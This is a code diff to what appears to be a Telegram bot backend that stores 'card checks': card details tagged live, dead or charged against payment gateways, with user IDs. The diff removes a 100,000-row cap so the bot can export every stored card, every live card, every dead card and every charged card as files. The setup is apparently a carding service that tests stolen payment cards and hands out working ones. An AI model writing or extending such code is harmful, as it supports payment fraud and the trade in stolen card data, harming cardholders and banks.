@@ -5376,12 +5376,11 @@ ${gatewayStats || "  No gateway data"}
 
       await sendTelegramMessage(chatId, "⏳ <b>Fetching all cards...</b>\n\nPlease wait while I prepare the file.");
 
-      // Fetch ALL cards with user info (no limit)
+      // Fetch ALL cards with user info (unlimited)
       const { data: cards, error } = await supabase
         .from("card_checks")
         .select("card_details, result, gateway, created_at, user_id")
-        .order("created_at", { ascending: false })
-        .limit(100000);
+        .order("created_at", { ascending: false });
 
       if (error || !cards || cards.length === 0) {
         await sendTelegramMessage(chatId, "❌ <b>No cards found</b>\n\nThe database has no card check records.");
@@ -5457,8 +5456,7 @@ ${gatewayStats || "  No gateway data"}
         .from("card_checks")
         .select("card_details, gateway, created_at, user_id")
         .eq("result", "live")
-        .order("created_at", { ascending: false })
-        .limit(100000);
+        .order("created_at", { ascending: false });
 
       if (error || !cards || cards.length === 0) {
         await sendTelegramMessage(chatId, "❌ <b>No live cards found</b>\n\nThere are no live card records in the database.");
@@ -5527,8 +5525,7 @@ ${gatewayStats || "  No gateway data"}
         .from("card_checks")
         .select("card_details, gateway, created_at, user_id")
         .eq("result", "dead")
-        .order("created_at", { ascending: false })
-        .limit(100000);
+        .order("created_at", { ascending: false });
 
       if (error || !cards || cards.length === 0) {
         await sendTelegramMessage(chatId, "❌ <b>No dead cards found</b>\n\nThere are no dead card records in the database.");
@@ -5597,8 +5594,7 @@ ${gatewayStats || "  No gateway data"}
         .from("card_checks")
         .select("card_details, gateway, created_at, user_id, result")
         .ilike("result", "%charged%")
-        .order("created_at", { ascending: false })
-        .limit(100000);
+        .order("created_at", { ascending: false });
 
       if (error || !cards || cards.length === 0) {
         await sendTelegramMessage(chatId, "❌ <b>No charged cards found</b>\n\nThere are no charged card records in the database.");
